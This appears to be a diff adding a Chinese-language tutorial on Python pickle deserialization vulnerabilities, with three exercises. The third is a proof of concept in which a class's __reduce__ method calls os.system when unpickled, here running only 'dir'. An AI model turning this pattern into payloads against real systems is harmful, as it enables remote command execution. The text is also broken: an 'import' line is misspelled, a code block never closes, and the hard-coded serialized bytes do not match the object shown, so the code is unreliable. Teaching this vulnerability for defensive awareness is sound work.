@@ -1,0 +1,57 @@
+## 一、核心目标
+1.  掌握Python中pickle序列化与反序列化的基础用法
+2.  理解Python反序列化漏洞的核心触发原理
+3.  直观感受反序列化漏洞的安全风险，建立防御意识
+
+---
+
+## 二、代码实现与逐行解析
+
+### 习题1 基础：Python对象pickle序列化
+```python
+import pickle
+
+# 定义一个简单的用户类
+class User:
+    def __init__(self, username, role):
+        self.username = username
+        self.role = role
+
+# 创建普通用户对象
+user = User("zhangsan", "user")
+# 序列化对象为字节流
+serialized_data = pickle.dumps(user)
+print("序列化后的字节流：", serialized_data)
+
+### 习题2 基础：pickle反序列化还原对象
+import pickle
+
+class User:
+    def __init__(self, username, role):
+        self.username = username
+        self.role = role
+
+# 使用习题1生成的序列化数据
+serialized_data = b'\x80\x04\x953\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94\x8c\x08zhangsan\x94\x8c\x04user\x94\x85\x94\x81\x94.'
+# 反序列化还原对象
+deserialized_user = pickle.loads(serialized_data)
+print("用户名：", deserialized_user.username)
+print("角色：", deserialized_user.role)
+
+### 习题3 实战：反序列化安全风险演示
+mport pickle
+import os
+
+# 恶意类：反序列化时会自动执行系统命令
+class Malicious:
+    def __reduce__(self):
+        # Windows系统用"dir"，Linux/macOS用"ls"
+        return (os.system, ("dir",))
+
+# 生成恶意序列化数据
+malicious_data = pickle.dumps(Malicious())
+print("恶意序列化数据：", malicious_data)
+
+# 反序列化恶意数据，会自动执行dir命令
+print("执行反序列化操作...")
+pickle.loads(malicious_data)
